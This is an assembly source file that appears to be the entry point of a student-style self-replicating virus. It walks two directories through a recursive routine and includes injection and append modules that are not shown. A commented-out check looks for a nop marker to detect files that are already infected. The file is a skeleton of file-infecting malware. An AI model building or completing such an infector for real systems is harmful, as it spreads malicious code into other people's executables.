%include "include.s"

 ;   lea r15, [rel jump + 1]
 ;   cmp byte [r15], 0x90                ; cette ligne permet de quiter le code une fois qu'il a été infecter
 ;   jnz close_mmap

section .text
    global main
    extern printf

main:
    push rbp
    mov rbp, rsp
    sub rsp, famine_size                        ;   le segv est sur la stack  peux etre modulo 8
    push rdx
    push rcx
    push rdi
    push rsi
    lea rdi, [rsp + pathBuffer]
    lea rsi, [rel firstDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive
    lea rdi, [rsp + pathBuffer]
    lea rsi, [rel secondDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive

exit:
;    mov rdi, 1
;    lea rsi, [rel signature]
;    mov rdx, SIGNATURE_SIZE
;    mov rax, SYS_WRITE
;    syscall
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    leave

jump:
    ret
    nop
    nop
    nop
    nop


%include "recursive.s"

%include "injection.s"

%include "ft_memcpy.s"

%include "ft_strcmp.s"

%include "append.s"

%include "data.s"